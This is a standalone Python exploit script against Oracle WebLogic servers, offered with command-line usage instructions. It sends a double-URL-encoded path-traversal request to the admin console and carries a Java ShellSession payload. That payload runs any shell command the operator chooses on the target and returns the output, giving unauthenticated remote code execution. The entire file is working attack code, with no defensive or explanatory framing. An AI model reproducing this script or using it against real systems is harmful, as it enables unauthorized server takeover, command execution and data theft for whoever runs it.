#!/usr/bin/python3

import requests
import sys
from urllib3.exceptions import InsecureRequestWarning

# Check if the correct number of arguments are provided
if len(sys.argv) != 3:
    print("[+] WebLogic Unauthenticated RCE via POST request")
    print("[+] Usage: python3 exploit.py http(s)://target:port command")
    print("[+] Example: python3 exploit.py http(s)://target:9500 \"id\"")
    sys.exit()

# Gather command line arguments
target = sys.argv[1]
command = sys.argv[2]

# Disable insecure request warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Initialize a session
session = requests.session()

# Set request headers
headers = {
    'Accept-Charset': 'iso-8859-1,utf-8;q=0.9,*;q=0.1',
    'Accept-Language': 'en',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Connection': 'Close',
    'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)',
    'Pragma': 'no-cache',
    'Accept': 'image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*'
}

# Craft the exploit payload
payload = {
    '_nfpb': 'true',
    '_pageLabel': '',
    'handle': 'com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = '
              '(weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork(); '
              'java.lang.reflect.Field field = adapter.getClass().getDeclaredField(\'connectionHandler\'); '
              'field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet.internal.ServletRequestImpl req = '
              '(weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod(\'getServletRequest\').invoke(obj); '
              'String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", "' + command + '"} : '
              'new String[]{"/bin/sh", "-c", "' + command + '"}; String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\\\A").next(); '
              'weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod(\'getResponse\').invoke(req); '
              'res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result)); res.getServletOutputStream().flush(); '
              'res.getWriter().write(""); executeThread.interrupt();")'
}

print("[+] Sending POST Request....")

# Make the POST request and capture the response
response = session.post(target + "/console/css/%252e%252e%252fconsole.portal", data=payload, headers=headers, verify=False)

# Check if the request was successful
if response.status_code == 200:
    print("[+] Successfully exploited the vulnerability.")
    print("[+] Response Code:", response.status_code)
    print("[+] Response:\n", response.text)
else:
    print("[-] Exploit failed. Response Code:", response.status_code)

print("[+] Done!!")
